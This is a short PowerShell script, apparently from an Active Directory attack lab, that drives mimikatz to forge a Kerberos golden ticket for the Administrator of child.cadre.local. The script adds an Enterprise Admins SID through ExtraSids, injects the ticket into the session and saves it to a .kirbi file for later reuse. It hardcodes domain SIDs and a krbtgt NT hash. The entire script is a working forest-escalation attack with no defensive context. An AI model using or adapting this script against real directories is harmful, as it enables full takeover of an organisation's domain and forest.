[CmdletBinding()]
param(
    [string]$ChildSid = 'S-1-5-21-2616196951-1941128886-767624593',
    [string]$EaSid = 'S-1-5-21-277764030-1371232215-1561074416-519',
    [string]$KrbtgtNt = 'b6c370f260f2ec4a9eabaedf34882ec1'
)
$ErrorActionPreference = "Continue"

$mimi = 'C:\Tools\ADTools\mimikatz.exe'
$ticket = 'C:\Tools\cadre-attack\T102-capture\EA.kirbi'
Remove-Item $ticket -ErrorAction SilentlyContinue

Write-Output '--- mimikatz kerberos::golden with ExtraSids ---'
& $mimi "privilege::debug" "kerberos::golden /user:Administrator /domain:child.cadre.local /sid:$ChildSid /krbtgt:$KrbtgtNt /sids:$EaSid /ptt" "kerberos::list" "exit" 2>&1 | ForEach-Object { Write-Output "MIMI|$_" }

Write-Output "--- write EA ticket to file for later reuse ---"
& $mimi "kerberos::golden /user:Administrator /domain:child.cadre.local /sid:$ChildSid /krbtgt:$KrbtgtNt /sids:$EaSid /ticket:$ticket" "exit" 2>&1 | ForEach-Object { Write-Output "MIMI2|$_" }
if (Test-Path $ticket) { Write-Output "EA_TICKET $((Get-Item $ticket).Length) bytes" } else { Write-Output "EA_TICKET_MISSING" }
